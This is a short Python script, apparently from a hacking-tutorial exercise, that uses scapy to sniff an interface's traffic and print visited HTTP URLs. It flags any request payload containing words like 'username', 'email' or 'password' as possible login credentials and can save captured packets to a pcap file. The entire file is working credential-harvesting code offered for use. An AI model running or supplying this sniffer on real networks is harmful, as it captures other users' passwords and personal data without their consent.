#!/usr/bin/env python3

import optparse
import scapy.all as scapy
from scapy.layers import http
from scapy.all import wrpcap


def get_options():
    parser = optparse.OptionParser()
    parser.add_option("-i", "--interface", dest="interface", help="Enter an interface that you want to sniff data from. DEFAULT - eth0", default="eth0")
    parser.add_option("-o", "--output", dest="output_path", help="Enter full path to save output file to. File extension '.pcap'. DEFAULT - NO OUTPUT.")
    return parser.parse_args()[0]

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login_info(packet):
    load = packet[scapy.Raw].load
    keywords = ["username", "login", "email", "password", "pass"]
    for keyword in keywords:
        if keyword in str(load):
            return load

def process_sniffed_packet(packet):
    if options.output_path:
        wrpcap(options.output_path, packet, append=True)
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("\033[92m[+] HTTP Request >> " + str(url))

        if packet.haslayer(scapy.Raw):
            login_info = get_login_info(packet)
            print("\n\n\033[94m[+] Possible username/password \033[0m>> \033[91m" + str(login_info) + "\n\n")

options = get_options()
sniff(options.interface)